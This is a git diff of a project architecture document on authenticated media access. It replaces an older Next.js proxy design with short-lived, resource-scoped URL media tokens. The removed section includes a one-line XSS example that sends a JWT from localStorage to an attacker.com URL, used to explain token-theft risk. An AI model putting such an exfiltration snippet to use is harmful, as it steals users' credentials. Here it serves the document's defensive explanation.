@@ -1,434 +1,130 @@
-# Resource Proxy Architecture
+# Authenticated Media Access
 
-## Overview
+> **Heads-up on the filename.** This doc used to describe a Next.js server-side
+> *proxy route* (`/api/resources/[id]`). That route is **gone** — the frontend
+> is now a pure Vite + React SPA (#557) with **no server**, and auth is
+> **bearer-only** (#890). There is nothing to proxy through. The live mechanism
+> is the **`?token=` media token** documented here; the `RESOURCE-PROXY` filename
+> is kept only so inbound links don't break.
 
-The frontend includes an authenticated proxy route at `/api/resources/[id]` that forwards browser requests for images, PDFs, and other resource representations to the backend with proper authentication. This document explains why this proxy is necessary and how it enables browser-based components like `<img>` tags and PDF.js to access authenticated resources.
+## The problem: header-less elements can't authenticate
 
-## The Problem: Browser Elements and PDF.js Can't Send Auth Headers
-
-HTML elements like `<img>`, `<iframe>`, `<video>`, and `<embed>` **cannot send custom HTTP headers**. Similarly, **PDF.js** (used by `PdfAnnotationCanvas`) fetches PDFs using the `fetch` API, but cannot access the server-side NextAuth JWT token:
+Semiont's backend is **bearer-only** — every request must carry
+`Authorization: Bearer <jwt>`, and there are **no ambient credentials** —
+nothing the browser attaches automatically, no cookie of any kind. That's a problem
+for the elements that load binary content, because they **cannot set request
+headers**:
 
 ```html
-<!-- ❌ This doesn't work - no way to add Authorization header -->
-<img src="https://backend.semiont.com/resources/123" />
-
-<!-- ❌ This also doesn't work -->
-<img src="https://backend.semiont.com/resources/123"
-     headers='{"Authorization": "Bearer xyz"}' />
+<!-- ❌ No way to attach Authorization: Bearer on an <img> -->
+<img src="https://backend.example.com/api/resources/123" />
 ```
 
 ```typescript
-// ❌ PDF.js cannot access httpOnly session cookie
+// ❌ PDF.js fetches by URL and likewise cannot add an Authorization header
 const pdf = await pdfjsLib.getDocument({
-  url: 'https://backend.semiont.com/resources/123',
-  // No way to add Authorization header without exposing JWT
+  url: 'https://backend.example.com/api/resources/123',
 }).promise;
 ```
 
-The only headers these elements send are:
-- **Cookies** for the domain (but backend expects Bearer tokens, not NextAuth sessions)
-- Standard headers (`Accept`, `User-Agent`, `Referer`, etc.)
+`<img>`, `<iframe>`, `<video>`, `<embed>`, and PDF.js URL-loading all send only
+the browser's standard headers. With no cookie to fall back on (bearer-only),
+they can't reach a protected resource on their own.
 
-Since Semiont requires authentication for resource access, browser elements and PDF.js cannot directly load authenticated resources from the backend.
+## The solution: a short-lived, resource-scoped token on the URL
 
-## The Solution: Authenticated Proxy
-
-The frontend proxy route solves this by acting as an authentication bridge:
-
-```
-Browser <img src="/api/resources/123">
-  ↓ (sends NextAuth session cookie - httpOnly, secure)
-Next.js Proxy (/api/resources/[id])
-  ↓ (extracts JWT from encrypted session server-side)
-  ↓ (adds Authorization: Bearer header)
-Backend (/resources/123)
-  ↓ (validates JWT)
-  ↓ (returns image/PDF/content)
-```
-
-**For PDF annotations**, the flow is identical:
+The frontend mints a **media token** — a narrowed credential the browser *can*
+carry, because it rides on the URL as a query parameter rather than in a header:
 
 ```typescript
-// PdfAnnotationCanvas.tsx
-const pdfUrl = `/api/resources/${resourceId}`; // ✅ Proxy route
-
-// Browser-side PDF.js fetch
-const response = await fetch(pdfUrl, {
-  credentials: 'include', // ✅ Sends NextAuth session cookie
-  headers: { 'Accept': 'application/pdf' }
-});
-
-// Proxy extracts JWT, forwards to backend with Authorization header
-// Backend returns PDF binary with Content-Type: application/pdf
+const { token } = await client.auth.mediaToken(resourceId);
+const url = `${client.baseUrl}/api/resources/${resourceId}?token=${token}`;
+// Hand `url` to <img src>, pdfjsLib.getDocument({ url }), etc.
 ```
 
-### Implementation
+`auth.mediaToken` calls `POST /api/tokens/media` (itself authenticated with the
+session's bearer token) and returns `{ token }`. The token is a JWT scoped to
+**exactly one resource** (`sub: resourceId`) and expiring in **5 minutes**. The
+backend accepts it on `GET /api/resources/:id` in place of the `Authorization`
+header.
 
-**File**: `apps/frontend/src/app/api/resources/[id]/route.ts`
+**This preserves authentication — it doesn't bypass it.** Getting a media token
+requires a valid session. The full claim format, validation, and OpenAPI spec
+live in the canonical
+[`@semiont/http-transport` MEDIA-TOKENS.md](../../../packages/http-transport/docs/MEDIA-TOKENS.md);
+this doc covers how the SPA uses it.
 
-The proxy performs four key functions:
+### Isn't a token in the URL a security hole?
 
-1. **Session validation** (lines 21-25):
-   ```typescript
-   const session = await getServerSession(authOptions);
-   if (!session?.backendToken) {
-     return new NextResponse('Unauthorized', { status: 401 });
-   }
-   ```
+A *session* token in a URL would be — query strings leak into proxy logs,
+browser history, and `Referer` headers, and a leaked session token grants the
+attacker hours of full access. A **media token's blast radius is tiny**:
+5 minutes × one specific resource. The `sub: resourceId` claim is the
+load-bearing safety property — a leaked media token is cryptographically useless
+against any *other* resource, even one the same user could open with their
+session token. That scoping is exactly why putting it on the URL is acceptable
+where putting a session token there would not be. See the **Threat model**
+section of [MEDIA-TOKENS.md](../../../packages/http-transport/docs/MEDIA-TOKENS.md).
 
-2. **Accept header filtering** (lines 32-40):
-   ```typescript
-   // Strip application/ld+json and application/json
-   // Forces backend to return raw representations (images, PDFs, etc.)
-   acceptHeader = acceptHeader
-     .split(',')
-     .filter(type => !type.includes('application/ld+json') && !type.includes('application/json'))
-     .join(', ') || '*/*';
-   ```
+## React usage
 
-3. **JWT injection** (lines 44-47):
-   ```typescript
-   const client = new SemiontApiClient({
-     baseUrl: backendUrl as BaseUrl,
-     eventBus: new EventBus(),
-     token$: new BehaviorSubject<AccessToken | null>(session.backendToken as AccessToken),
-   });
-   ```
-
-4. **Streaming proxy** (lines 49-63):
-   ```typescript
-   const { stream, contentType } = await client.getResourceRepresentationStream(rId, {
-     accept: acceptHeader as ContentFormat,
-   });
-
-   return new NextResponse(stream, {
-     status: 200,
-     headers: {
-       'Content-Type': contentType,
-       'Cache-Control': 'public, max-age=31536000, immutable',
-     },
-   });
-   ```
-
-## Why This Architecture Makes Sense
-
-### 1. Security: No JWT Exposure
-
-**Problem**: If we exposed the JWT to client-side JavaScript, it would be vulnerable to XSS attacks:
-
-```javascript
-// ❌ BAD: JWT accessible to JavaScript
-localStorage.setItem('jwt', token);
-
-// Any XSS attack can steal it:
-<script>
-  fetch('https://attacker.com/steal?jwt=' + localStorage.getItem('jwt'));
-</script>
-```
-
-**Solution**: The proxy keeps the JWT on the server-side:
-
-- ✅ JWT stored in encrypted NextAuth session (httpOnly cookie)
-- ✅ Client-side JavaScript **cannot access** httpOnly cookies
-- ✅ XSS attacks **cannot steal** the JWT
-- ✅ JWT only exists in server memory during proxy request
-
-### 2. Clean Separation of Concerns
-
-The proxy maintains a clear architectural boundary:
-
-```
-┌─────────────────────────────────────┐
-│ Frontend (Next.js + NextAuth)       │
-│ - Manages encrypted sessions        │
-│ - Extracts JWT for API calls        │
-│ - Knows about NextAuth internals    │
-└─────────────────────────────────────┘
-                 ↓ JWT Bearer Token
-┌─────────────────────────────────────┐
-│ Backend (Hono API)                  │
-│ - Only knows about JWT              │
-│ - Pure API service                  │
-│ - Framework agnostic                │
-└─────────────────────────────────────┘
-```
-
-**Benefits**:
-- Backend doesn't need to know about NextAuth sessions
-- Backend only handles standard Bearer token authentication
-- Frontend can change session management without touching backend
-- Clear responsibility boundaries
-
-### 3. Memory Efficiency: Streaming
-
-The proxy uses streaming to avoid loading entire files into memory:
+Components don't manage tokens by hand. The `useMediaToken` hook from
+`@semiont/react-ui` fetches a token on mount and refreshes it every **4 minutes**
+— ahead of the 5-minute expiry, so an in-flight load never races the rollover:
 
 ```typescript
-// Get resource as stream (not buffered)
-const { stream, contentType } = await client.getResourceRepresentationStream(rId, {
-  accept: acceptHeader as ContentFormat,
-});
+import { useMediaToken } from '@semiont/react-ui';
 
-// Stream directly to client - backend → proxy → browser
-return new NextResponse(stream, {
-  status: 200,
-  headers: { 'Content-Type': contentType },
-});
+const { token, loading } = useMediaToken(resourceId);
+const src = token ? `${baseUrl}/api/resources/${resourceId}?token=${token}` : undefined;
 ```
 
-This is critical for large files:
-- Images (can be several MB)
-- **PDFs (can be 10s of MB)** - especially important for `PdfAnnotationCanvas`
-- Videos (can be 100s of MB)
+`ResourceViewerPage` calls this automatically for any resource whose media type
+renders as an image (which includes `application/pdf`), so callers of
+`ResourceViewerPage` get authenticated `<img>`/PDF rendering for free.
 
-Without streaming, each request would load the entire file into Node.js memory before sending to client. For a 20MB PDF, this would consume 20MB of server memory per concurrent request.
+## Data flow for binary resources
 
-### 4. Standard Pattern
-
-This is a **well-established pattern** in modern web applications:
-
-- Next.js + backend API: Proxy routes for authenticated resources
-- React SPA + backend API: Server-side proxy for auth injection
-- Any framework + OAuth: Session-to-bearer-token translation layer
-
-It's not a workaround - it's the **correct solution** for authenticated resources in browsers.
-
-## Alternative Approaches (And Why They're Worse)
-
-### ❌ Alternative 1: Make Backend Route Public
-
-```typescript
-// Remove authentication from /resources/:id
-export function createResourceRouter(): ResourcesRouterType {
-  const router = new Hono();
-  // No authMiddleware!
-  return router;
-}
+```
+ResourceViewerPage
+  → useMediaToken(resourceId)
+      → POST /api/tokens/media   (bearer-authenticated, once per 4 min)
+      → { token }
+  → resourceUrl = `${baseUrl}/api/resources/${id}?token=${token}`
+  → passes resourceUrl to the viewer component
+  → <img src={resourceUrl}>  or  pdfjsLib.getDocument({ url: resourceUrl })
+      → browser / PDF.js fetches directly and streams — no ArrayBuffer in JS
 ```
 
-**Problems**:
-- Anyone can access any resource without authentication
-- Massive security hole
-- Defeats entire authentication system
+Streaming directly through the browser (rather than buffering the bytes into the
+JS heap) keeps large files — multi-MB images, tens-of-MB PDFs — off the main
+thread and preserves progressive rendering and HTTP cache participation.
 
-### ❌ Alternative 2: Token in URL Query Parameter
+## Text resources don't use media tokens
 
-```html
-<img src="https://backend.semiont.com/resources/123?token=eyJhbGc..." />
-```
+The split is **display vs programmatic**, not text vs binary:
 
-**Problems**:
-- **Exposes JWT in URLs** (browser history, server logs, referrer headers)
-- Tokens leaked to any external resources the page links to
-- Major security vulnerability
-- Visible in browser dev tools
+- **Text** (`text/plain`, `text/markdown`, …) is fetched by `useResourceContent`
+  through the authenticated representation endpoint and decoded to a string —
+  a normal bearer-authenticated request, no media token.
+- **Binary display** (`<img>`, PDF.js) uses media tokens, as above.
+- **Non-browser consumers** (CLI, daemon, MCP server) never need a media token:
+  they read binary content through `IContentTransport.getBinary` with normal
+  `Authorization` headers, and upload through `client.yield.resource(...)` /
+  `IContentTransport.putBinary`. Media tokens are read-path-only and browser-only.
 
-### ⚠️ Alternative 3: Backend Reads Session Cookie
+## Related documentation
 
-Make backend decrypt NextAuth sessions:
-
-```typescript
-// Backend middleware
-const sessionCookie = c.req.cookie('next-auth.session-token');
-const decoded = await decode({
-  token: sessionCookie,
-  secret: process.env.NEXTAUTH_SECRET!,
-});
-```
-
-**Problems**:
-- Couples backend to NextAuth implementation
-- Backend must install `next-auth` npm package
-- Backend must share `NEXTAUTH_SECRET` with frontend
-- Backend tests now require NextAuth session encryption
-- Loses framework independence
-- More complex secret management
-
-**When this would be acceptable**:
-- You're committed to Next.js forever (no framework changes)
-- Backend and frontend are truly a monolith (deployed together)
-- You're willing to maintain NextAuth compatibility in backend
-
-### ⚠️ Alternative 4: Signed URLs
-
-Backend generates time-limited signed URLs:
-
-```typescript
-// Frontend requests signed URL
-const signedUrl = await fetch('/api/resources/123/signed-url').then(r => r.json());
-
-// Browser loads with signature (no auth needed)
-<img src={signedUrl.url} />
-// URL: /resources/123?signature=abc123&expires=1234567890
-```
-
-**Trade-offs**:
-- ✅ No JWT exposure
-- ✅ Time-limited access
-- ✅ Works with `<img>` tags
-- ⚠️ Extra API call to get signed URL
-- ⚠️ More complex backend logic
-- ⚠️ Requires HMAC secret management
-
-**When this would make sense**:
-- Resources need to be shared publicly for limited time
-- CDN caching is critical
-- Resources are accessed frequently from many IPs
-
-## Current Deployment Architecture
-
-Semiont uses Envoy to route requests on a single origin:
-
-```yaml
-# .devcontainer/envoy.yaml
-routes:
-  # Frontend proxy (handles authentication)
-  - match: { prefix: "/api/resources" }
-    route: { cluster: frontend }  # → localhost:3000
-
-  # Backend API (requires Bearer token)
-  - match: { prefix: "/resources" }
-    route: { cluster: backend }   # → localhost:4000
-```
-
-**Flow**:
-```
-Browser → localhost:8080/api/resources/123 (Envoy)
-  ↓ (routes to frontend)
-Next.js → localhost:3000/api/resources/123
-  ↓ (adds auth, calls backend)
-Backend → localhost:4000/resources/123
-  ↓ (validates JWT, returns content)
-```
-
-Even though everything is on the same origin via Envoy, the proxy is still valuable because:
-1. **Security**: Keeps JWT extraction server-side
-2. **Clean abstraction**: Backend only handles Bearer tokens
-3. **Framework independence**: Can swap Next.js without touching backend
-4. **Testing simplicity**: Backend tests only need JWTs
-
-## Performance Considerations
-
-### Latency
-
-The proxy adds **one additional network hop**:
-
-- Without proxy: Browser → Backend (1 hop)
-- With proxy: Browser → Frontend → Backend (2 hops)
-
-**Mitigation**:
-- Envoy routes on localhost (sub-millisecond routing)
-- Streaming prevents memory buffering
-- Aggressive caching headers (`max-age=31536000, immutable`)
-
-For most resources, the latency overhead is **negligible** compared to the security and architectural benefits.
-
-### Caching
-
-The proxy sets aggressive caching headers:
-
-```typescript
-headers: {
-  'Cache-Control': 'public, max-age=31536000, immutable',
-}
-```
-
-**Why this works**:
-- Resources are content-addressed (checksum-based storage)
-- Once stored, a resource never changes
-- If content changes, it gets a new ID
-- Browser caches responses for 1 year
-
-This means the proxy only runs **once per resource per client**. Subsequent requests hit the browser cache.
-
-## Testing
-
-The proxy simplifies testing by maintaining clear boundaries:
-
-**Backend tests** (only need JWT):
-```typescript
-const res = await app.request('/resources/123', {
-  headers: { Authorization: `Bearer ${testJWT}` }
-});
-```
-
-**Frontend tests** (can mock the proxy):
-```typescript
-// Mock the proxy route in MSW for images
-http.get('/api/resources/:id', () => {
-  return HttpResponse.arrayBuffer(mockImageBuffer, {
-    headers: { 'Content-Type': 'image/png' }
-  });
-});
-
-// Mock for PDFs (used by PdfAnnotationCanvas)
-http.get('/api/resources/:id', () => {
-  return HttpResponse.arrayBuffer(mockPdfBuffer, {
-    headers: { 'Content-Type': 'application/pdf' }
-  });
-});
-```
-
-Without the proxy, backend tests would need to mock NextAuth session encryption, creating unnecessary coupling.
-
-## Summary
-
-The resource proxy is a **75-line route** that provides:
-
-1. ✅ **Security**: No JWT exposure to client-side JavaScript
-2. ✅ **Clean architecture**: Backend stays framework-agnostic
-3. ✅ **Memory efficiency**: Streaming for large files
-4. ✅ **Standard pattern**: Widely used in modern web apps
-5. ✅ **Testing simplicity**: Clear boundaries for isolated tests
-6. ✅ **Browser compatibility**: Works with `<img>`, `<iframe>`, etc.
-
-The proxy is not a workaround - it's the **correct architectural solution** for authenticated resources in browser applications.
-
-## Usage Examples
-
-### Image Tags
-
-```typescript
-// ImageViewer.tsx
-<img
-  src={`/api/resources/${resourceId}`}
-  alt="Resource"
-/>
-```
-
-### PDF Annotation Canvas
-
-```typescript
-// PdfAnnotationCanvas.tsx
-const pdfUrl = `/api/resources/${resourceId}`;
-
-// PDF.js loads the PDF
-const response = await fetch(pdfUrl, {
-  credentials: 'include',
-  headers: { 'Accept': 'application/pdf' }
-});
-const arrayBuffer = await response.arrayBuffer();
-const pdf = await pdfjsLib.getDocument({ data: arrayBuffer }).promise;
-```
-
-The proxy automatically:
-1. Validates the user's session
-2. Extracts the JWT from the encrypted session cookie
-3. Forwards the request to the backend with `Authorization: Bearer {jwt}`
-4. Streams the PDF binary back to the browser
-5. Sets proper caching headers for content-addressed resources
-
-## Related Documentation
-
-- [Frontend Authentication Architecture](./AUTHENTICATION.md) - Complete authentication system
-- [Backend Authentication Guide](../../backend/docs/AUTHENTICATION.md) - Backend JWT validation
-- [System Authentication Architecture](../../../docs/system/administration/AUTHENTICATION.md) - End-to-end auth flows
+- [`@semiont/http-transport` MEDIA-TOKENS.md](../../../packages/http-transport/docs/MEDIA-TOKENS.md) — the canonical media-token spec (claims, threat model, OpenAPI)
+- [Frontend Authentication Architecture](./AUTHENTICATION.md) — the SPA's bearer-only session model
+- [Backend Authentication Guide](../../backend/docs/AUTHENTICATION.md) — JWT validation, including the `?token=` media path
+- [System Authentication Architecture](../../../docs/system/administration/AUTHENTICATION.md) — end-to-end auth flows
 
 ---
 
-**Last Updated**: 2026-02-03
-**Implementation**: `apps/frontend/src/app/api/resources/[id]/route.ts` (69 lines)
-**Key Components**:
-- `apps/frontend/src/app/api/resources/[id]/route.ts` - Proxy route
-- `packages/react-ui/src/components/pdf-annotation/PdfAnnotationCanvas.tsx` - PDF usage
-- `packages/react-ui/src/lib/browser-pdfjs.ts` - PDF.js wrapper
+**Last Updated**: 2026-06-20
+**Key implementation**:
+- `packages/react-ui/src/hooks/useMediaToken.ts` — the refreshing token hook
+- `packages/react-ui/src/features/resource-viewer/components/ResourceViewerPage.tsx` — builds the `?token=` URL for binary resources
+- `packages/sdk/src/namespaces/auth.ts` — `auth.mediaToken()` → `POST /api/tokens/media`
+- `packages/react-ui/src/lib/browser-pdfjs.ts` — PDF.js loader that consumes the `?token=` URL
